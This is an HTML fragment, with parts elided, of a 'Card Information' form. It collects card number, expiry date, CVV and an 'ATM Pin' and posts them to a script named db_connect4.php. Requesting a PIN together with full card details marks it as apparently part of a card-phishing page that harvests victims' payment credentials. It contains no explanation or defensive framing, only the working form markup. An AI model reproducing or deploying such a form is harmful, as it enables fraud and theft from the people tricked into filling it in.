            ...
            <div class="container container--fluid">
                <div data-v-0e68e607="" id="content">
                    <div data-v-63c8da32="" data-v-0e68e607="">
                        <h1 data-v-63c8da32="" class="text-h4">Card Information</h1>
                        <div data-v-2906dda8="" data-v-63c8da32="" class="row">
                            <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                <form data-v-63c8da32="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="db_connect4.php" method="post">
                                <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                    ...
                                                    <div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><input autocomplete="off" placeholder="Card Number" id="cn" required="" type="text" name="cn"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><input autocomplete="off" placeholder="Expiry Date" id="exdate" required="" type="text" name="exdate"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><input autocomplete="off" placeholder="CVV" minlength="3" maxlength="4" id="cvv" type="text" required="" name="cvv"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><input autocomplete="off" placeholder="ATM Pin" id="pin" type="text" name="pin" required=""></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            ...
                                            <div data-v-63c8da32="" class="mt-4"><button data-v-63c8da32="" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary"><span class="v-btn__content">Submit</span></button>
